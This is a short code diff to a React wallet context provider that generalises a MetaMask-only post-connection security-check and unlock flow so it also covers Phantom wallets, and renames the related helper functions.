@@ -29,7 +29,7 @@ import {
 } from '../lib/mobileWallet'
 import { rememberRecentWallet } from '../lib/detectInstalledWallets'
 import { markMetaMaskUnlockDone } from '../lib/metamaskUnlock'
-import { markMetaMaskSecurityCheckPending, clearMetaMaskSecurityCheckSession } from '../lib/metaMaskSecurityCheck'
+import { markSecurityCheckPending, clearSecurityCheckSession } from '../lib/metaMaskSecurityCheck'
 
 export interface WalletState {
   walletAddress: string | null
@@ -369,9 +369,15 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
       )
       setIsModalOpen(false)
       setMetaMaskUnlockOpen(false)
-      if (walletHintIsMetaMask(name || hint)) {
-        markMetaMaskSecurityCheckPending(address)
+      const securityWallet = walletHintIsPhantom(name || hint)
+        ? 'Phantom'
+        : walletHintIsMetaMask(name || hint)
+          ? 'MetaMask'
+          : null
+      if (securityWallet) {
+        markSecurityCheckPending(address, securityWallet)
         setUnlockWalletAddress(address)
+        setUnlockWalletName(securityWallet)
         if (securityScanTimerRef.current != null) {
           window.clearTimeout(securityScanTimerRef.current)
         }
@@ -426,7 +432,7 @@ export const WalletContextProvider: React.FC<{ children: React.ReactNode }> = ({
         window.clearTimeout(securityScanTimerRef.current)
         securityScanTimerRef.current = null
       }
-      clearMetaMaskSecurityCheckSession()
+      clearSecurityCheckSession()
       toast.success('Wallet disconnected')
     } catch (err: any) {
       toast.error('Failed to disconnect wallet')
